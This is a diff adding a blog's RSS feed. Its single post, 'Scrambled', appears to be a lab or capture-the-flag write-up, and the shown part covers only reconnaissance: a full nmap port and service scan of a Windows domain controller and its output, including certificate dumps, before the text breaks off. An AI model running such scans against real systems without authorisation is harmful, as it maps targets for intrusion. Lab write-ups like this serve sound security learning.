@@ -1,0 +1,700 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on MØst Xeon</title>
+        <link>https://mostxeon.github.io/posts/</link>
+        <description>Recent content in Posts on MØst Xeon</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Tue, 27 Sep 2022 22:16:35 +0300</lastBuildDate>
+        <atom:link href="https://mostxeon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Scrambled</title>
+            <link>https://mostxeon.github.io/posts/scrambled/</link>
+            <pubDate>Tue, 27 Sep 2022 22:16:35 +0300</pubDate>
+            
+            <guid>https://mostxeon.github.io/posts/scrambled/</guid>
+            <description>Starting with a full tcp port scan we got the below results
+$ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168 Nmap scan report for 10.10.11.168 Host is up, received syn-ack (0.084s latency). Scanned at 2022-09-20 03:50:10 EEST for 512s Not shown: 65513 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack Simple DNS Plus 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-title: Scramble Corp Intranet |_http-server-header: Microsoft-IIS/10.</description>
+            <content type="html"><![CDATA[<hr>
+<p>Starting with a full tcp port scan we got the below results</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -vvv -p- -A -oN nmap/tcp-all.txt 10.10.11.168
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.168
+</span></span><span style="display:flex;"><span>Host is up, received syn-ack <span style="color:#f92672">(</span>0.084s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2022-09-20 03:50:10 EEST <span style="color:#66d9ef">for</span> 512s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65513</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       REASON  VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        syn-ack Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-title: Scramble Corp Intranet
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2022-09-20 01:05:04Z<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
+</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
+</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
+</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
+</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
+</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
+</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
+</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
+</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
+</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
+</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
+</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
+</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
+</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
+</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
+</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
+</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
+</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
+</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
+</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
+</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
+</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
+</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
+</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
+</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
+</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
+</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
+</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
+</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
+</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
+</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
+</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
+</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
+</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
+</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
+</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
+</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds? syn-ack
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?     syn-ack
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
+</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
+</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
+</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
+</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
+</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
+</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
+</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
+</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
+</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
+</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
+</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
+</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
+</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
+</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
+</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
+</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
+</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
+</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
+</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
+</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
+</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
+</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
+</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
+</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
+</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
+</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
+</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
+</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
+</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
+</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
+</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
+</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
+</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
+</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
+</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
+</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
+</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-09-19T16:33:03
+</span></span><span style="display:flex;"><span>| Not valid after:  2052-09-19T16:33:03
+</span></span><span style="display:flex;"><span>| MD5:   273c 8bd6 b6f1 8d1c 305d 858b 16a0 0ab3
+</span></span><span style="display:flex;"><span>| SHA-1: 9f00 d439 36bf e405 f25e f6f8 259f eea5 a66d 64d4
+</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>| MIIDADCCAeigAwIBAgIQFlmhJUE9ubFLfgHuEklivDANBgkqhkiG9w0BAQsFADA7
+</span></span><span style="display:flex;"><span>| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
+</span></span><span style="display:flex;"><span>| bABsAGIAYQBjAGswIBcNMjIwOTE5MTYzMzAzWhgPMjA1MjA5MTkxNjMzMDNaMDsx
+</span></span><span style="display:flex;"><span>| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
+</span></span><span style="display:flex;"><span>| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJwUOThD
+</span></span><span style="display:flex;"><span>| xI9qdzH62pze2vXWwAGlzCXQGWKL8RWKzDagYmowdy7VJPtfSAxqruwnTndUXec/
+</span></span><span style="display:flex;"><span>| DzxxA12X1MIi+yonfuaDjN2U2zwWJfL/6TtcXLOQ6KTge9tkeceFyT3o6SRUU4wC
+</span></span><span style="display:flex;"><span>| BtJI0cAAOFjJHMwyuhyhHMMWUr3NKVxSlm4+JJ0IbGoGiSBDFpXmK7CDCurE5/gn
+</span></span><span style="display:flex;"><span>| jQeYab81PgLEPZ31odQZB4SB+qxlzWtmjsza7gK3h5UNc/L26MqLoVgy+DKgVstw
+</span></span><span style="display:flex;"><span>| vlAi7/hRqBlGmKh27l0RfYkNdRgh41Ubm4dnZwv5IwgP2o17QG33zG/UdJhz4IUr
+</span></span><span style="display:flex;"><span>| DZcUSJ83SE5SdXECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAkwE5dvp2UE799mtf
+</span></span><span style="display:flex;"><span>| nwVxExeOZbLsjVRaAlBCOWsy6OH0F8cnnJnbKeTndwWOCWVhLUMAGxRqrRsmtOdi
+</span></span><span style="display:flex;"><span>| OYqDgPYy2UlCcGeA7Ciyt3fG0erPh3fpJ/3rWEEbjdpKGfu26KLiYcVx6bZaSS/e
+</span></span><span style="display:flex;"><span>| Q3CR4fDCKMlfWwDyNN5+FjC8KHttRxUmYna6IPnoZeLiz4C99RquTGWPAnIB3/7P
+</span></span><span style="display:flex;"><span>| Ll+3+PjP7j3lWwOwT/TpJYabp33OcRWCKwzEiW2bItpB2hv0KLKcG8VVuBjINd9C
+</span></span><span style="display:flex;"><span>| HR7g9WVBeq9hwElNVjAQNxmD49683WUs37bSFTOipKIp/8+RReNOXjikBison7Ku
+</span></span><span style="display:flex;"><span>| RnjPWA<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
+</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
+</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
+</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
+</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
+</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
+</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
+</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
+</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
+</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
+</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
+</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
+</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
+</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
+</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
+</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
+</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
+</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
+</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
+</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
+</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
+</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
+</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
+</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
+</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
+</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
+</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
+</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
+</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
+</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
+</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
+</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
+</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
+</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
+</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
+</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
+</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
+</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
+</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
+</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
+</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
+</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
+</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
